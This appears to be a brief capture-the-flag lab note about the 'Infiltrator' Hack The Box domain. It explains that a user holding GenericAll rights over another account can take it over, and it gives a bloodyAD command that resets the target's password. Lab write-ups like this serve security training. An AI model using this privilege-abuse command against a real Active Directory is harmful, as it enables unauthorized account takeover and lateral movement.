The user D.ANDERSON@INFILTRATOR.HTB has GenericAll privileges to the user E.RODRIGUEZ@INFILTRATOR.HTB.

This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.

![[Pasted image 20240904201810.png]]

```bash
bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos -u "d.anderson" -p '<password>' set password "e.rodriguez" 'Password123'
```

